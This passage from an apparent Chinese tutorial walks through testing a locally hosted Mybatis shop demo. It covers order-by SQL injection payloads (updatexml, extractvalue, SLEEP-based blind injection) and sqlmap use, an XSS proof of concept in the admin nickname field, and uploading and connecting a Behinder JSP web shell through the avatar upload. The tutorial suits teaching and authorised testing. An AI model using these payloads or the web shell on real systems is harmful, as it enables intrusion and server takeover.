class="hljs-number">1</span>&amp;isDesc=true<br></code></pre></td></tr></table></figure><p><img src="/img/orderby%E7%AD%89%E4%BA%8E1.jpg" alt="orderby等于1"></p><p><code>orderBy=99</code>，返回错误页面</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8088</span><span class="hljs-regexp">/tmall/</span>admin<span class="hljs-regexp">/user/</span><span class="hljs-number">1</span>/<span class="hljs-number">10</span>?user_name=&amp;user_gender_array=&amp;orderBy=<span class="hljs-number">99</span>&amp;isDesc=true<br></code></pre></td></tr></table></figure><p><img src="/img/orderby%E7%AD%89%E4%BA%8E99.jpg" alt="orderby等于99"></p><p>基本确定存在<code>order by类型的SQL注入</code>。</p><h4 id="2-4-2、进一步验证判断"><a href="#2-4-2、进一步验证判断" class="headerlink" title="2.4.2、进一步验证判断"></a>2.4.2、进一步验证判断</h4><ul><li>①、使用rand函数结果显示排序方式不同</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">orderBy</span><span class="hljs-operator">=</span>rand(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>)<br><span class="hljs-attribute">orderBy</span><span class="hljs-operator">=</span>rand(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><ul><li>②、利用regexp（正则表达式）</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">orderBy</span>=(select+<span class="hljs-number">1</span>+regexp+if(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x00)) 正常<br><span class="hljs-attribute">orderBy</span>=(select+<span class="hljs-number">1</span>+regexp+if(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x00)) 错误<br></code></pre></td></tr></table></figure><ul><li>③、利用updatexml（更新选定XML片段的内容）</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">orderBy</span>=updatexml(<span class="hljs-number">1</span>,if(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,user()),<span class="hljs-number">1</span>) 正确<br><span class="hljs-attribute">orderBy</span>=updatexml(<span class="hljs-number">1</span>,if(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,user()),<span class="hljs-number">1</span>) 错误<br></code></pre></td></tr></table></figure><ul><li>④、利用extractvalue（从目标XML中返回包含所查询值的字符串）</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">orderBy</span>=extractvalue(<span class="hljs-number">1</span>,if(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,user())) 正确<br><span class="hljs-attribute">orderBy</span>=extractvalue(<span class="hljs-number">1</span>,if(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,user())) 错误<br></code></pre></td></tr></table></figure><ul><li>⑤、时间盲注</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">orderBy</span>=if(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,(SELECT(<span class="hljs-number">1</span>)FROM(SELECT(SLEEP(<span class="hljs-number">2</span>)))test)) 正常响应时间<br><span class="hljs-attribute">orderBy</span>=if(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,(SELECT(<span class="hljs-number">1</span>)FROM(SELECT(SLEEP(<span class="hljs-number">2</span>)))test)) sleep <span class="hljs-number">2</span>秒<br></code></pre></td></tr></table></figure><h4 id="2-4-3、使用SQLmap"><a href="#2-4-3、使用SQLmap" class="headerlink" title="2.4.3、使用SQLmap"></a>2.4.3、使用SQLmap</h4><p>①、将数据包保存放入txt文件中，在orderBy参数处键入<code>*</code>，表示只对该地方进行探测注入。如下图所示：</p><p><img src="/img/r-txt.jpg" alt="r-txt"></p><p>②、命令行进入SQLmap文件中，并键入命令：<code>python sqlmap.py -r txt文件地址</code>，如下图所示：</p><p><img src="/img/sqlmap-r.jpg" alt="sqlmap-r"></p><p>③、回车，进行SQL注入攻击，最终得到结果如下：</p><p><img src="/img/SQLmap%E7%BB%93%E6%9E%9C.jpg" alt="SQLmap结果"></p><p>在平时工作授权黑盒渗透测试时，对于Mybatis项目，可以多多关注不能使用<code>#&#123;&#125;</code>转义的场景，就比如上述<code>order by</code>语句。</p><h3 id="2-5、XSS漏洞验证"><a href="#2-5、XSS漏洞验证" class="headerlink" title="2.5、XSS漏洞验证"></a>2.5、XSS漏洞验证</h3><p><strong>管理后台 - 我的账户 - 管理员昵称处存在XSS漏洞。</strong></p><p>访问上述功能，在管理员昵称处键入XSS漏洞验证POC，<code>&lt;img src=1 onerror=alert(1) /&gt;</code>，点击保存。如下图所示：</p><p><img src="/img/%E7%AE%A1%E7%90%86%E5%91%98%E6%98%B5%E7%A7%B0%E4%BF%9D%E5%AD%98xss.png" alt="管理员昵称保存xss"></p><p>触发XSS弹框，如下图所示：</p><p><img src="/img/xss%E6%BC%8F%E6%B4%9E%E5%BC%B9%E6%A1%861.jpg" alt="xss漏洞弹框1"></p><p>其他地方，大家自由发挥。</p><h3 id="2-6、任意文件上传漏洞验证"><a href="#2-6、任意文件上传漏洞验证" class="headerlink" title="2.6、任意文件上传漏洞验证"></a>2.6、任意文件上传漏洞验证</h3><p>在代码审计阶段，我们确定了管理后台中管理员头像上传处存在任意文件上传漏洞。</p><p>我们从渗透测试角度对其进行漏洞验证。</p><p>工具涉及到BurpSuite和冰蝎（下载地址：<code>https://github.com/rebeyond/Behinder</code>，本课程文件夹中有该工具）</p><p>①、首先，访问<code>后台管理-我的账户</code>功能。并且打开BurpSuite，以及浏览器代理并指向BurpSuite地址。</p><p>②、点击管理员头像，选择任意图片进行上传。此时BurpSuite抓取到上传文件数据包，将其发送到Repeater模块，以备后续使用，数据包如下图所示：</p><p><img src="/img/%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%95%B0%E6%8D%AE%E5%8C%85.jpg" alt="上传文件数据包"></p><p>③、修改filename后缀名为<code>.jsp</code>，并修改<code>Content-Type: text/plain</code>。将原先文件数据内容删除，并将冰蝎<code>server/shell.jsp</code>木马内容复制粘贴到上传数据包处后，点击发送数据包，获取到文件名字。如下图所示：</p><p><img src="/img/%E4%B8%8A%E4%BC%A0jsp%E6%9C%A8%E9%A9%AC.jpg" alt="上传jsp木马"></p><p>④、从渗透测试角度进行分析，我们找一下文件URL路径。浏览器（我用的火狐，快捷键为F12）打开查看器，定位到图片，可以看到该图片的URL，如下图所示：</p><p><img src="/img/%E5%AE%9A%E4%BD%8D%E5%88%B0%E5%9B%BE%E7%89%87url.jpg" alt="定位到图片url"></p><p>⑤、既然知道了图片路径URL，将我们的木马拼凑一下，获得URL地址为：<code>http://127.0.0.1:8088/tmall/res/images/item/adminProfilePicture/464b8a45-841d-45fa-959f-08de37d034d7.jsp</code>。</p><p>⑥、打开冰蝎，右键新增，将URL地址粘贴进去，并键入密码（默认密码为：<code>rebeyond</code>），如下图所示：</p><p><img src="/img/%E6%96%B0%E5%A2%9E%E5%86%B0%E8%9D%8E.jpg" alt="新增冰蝎"></p><p>⑦、点击保存后，网站列表多了我们新增加的地址，双击该地址，即可连接JSP木马，如下图所示：</p><p><img src="/img/%E8%BF%9E%E6%8E%A5JSP%E6%9C%A8%E9%A9%AC.jpg" alt="连接JSP木马"></p><p>至此，任意文件上传漏洞验证完毕。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
